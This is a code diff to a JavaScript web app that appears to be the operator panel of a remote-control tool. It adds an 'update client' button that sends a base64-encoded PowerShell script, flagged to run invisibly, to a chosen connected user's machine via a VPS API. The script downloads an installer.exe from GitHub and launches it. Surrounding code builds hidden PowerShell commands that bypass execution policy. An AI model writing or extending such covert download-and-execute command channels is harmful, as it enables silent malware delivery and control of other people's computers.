@@ -494,7 +494,61 @@ const RunApp = (() => {
         return `powershell -NoP -EP Bypass -W ${hidden ? 'H' : 'Normal'} -EncodedCommand ${bytesToBase64(utf16)}`;
     }
     function isSpecialCommandInput(text) {
-        return /^(panic|nodat|altf4|sauce)(?:\b|$)/i.test((text || '').trim());
+        return /^(panic|nodat|altf4)(?:\b|$)/i.test((text || '').trim());
+    }
+
+    const UPDATE_CLIENT_SCRIPT = `$p = "$env:APPDATA\\run"
+if (!(Test-Path $p)) { 
+    New-Item -ItemType Directory -Path $p 
+}
+
+$sha = (Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits/main').sha
+$o = "$p\\installer.exe"
+
+Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o
+Start-Process $o`;
+
+    async function doSendUpdateClient() {
+        if (isSendingCommand) return;
+        const user = runState.popupUser;
+        if (!user) return;
+        if (!runState.isConnected || user.demo) {
+            closePopup();
+            alert('Demo mode: action preview only. Connect to send real commands.');
+            return;
+        }
+
+        const btn = $('update-client-btn');
+        if (btn) {
+            btn.disabled = true;
+            btn.textContent = 'sending...';
+        }
+
+        isSendingCommand = true;
+        const body = {
+            username: user.username,
+            cmd: btoa(unescape(encodeURIComponent(UPDATE_CLIENT_SCRIPT))),
+            visible: 0
+        };
+
+        try {
+            const res = await fetch(`${VPS_URL}/api/command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
+                body: JSON.stringify(body)
+            });
+            if (!res.ok) throw new Error('Failed to send command');
+            closePopup();
+            fetchData();
+        } catch (e) {
+            alert('Failed to send update command.');
+        } finally {
+            isSendingCommand = false;
+            if (btn) {
+                btn.disabled = false;
+                btn.textContent = 'update client';
+            }
+        }
     }
 
     // ── Send / fetch ──
@@ -721,6 +775,7 @@ const RunApp = (() => {
         $('vis-true').onclick = () => setPopupVisibility(true);
         $('vis-false').onclick = () => setPopupVisibility(false);
         $('upload-btn').onclick = () => $('file-upload').click();
+        $('update-client-btn')?.addEventListener('click', doSendUpdateClient);
 
         $('file-upload').onchange = e => {
             const file = e.target.files[0]; if (!file) return;
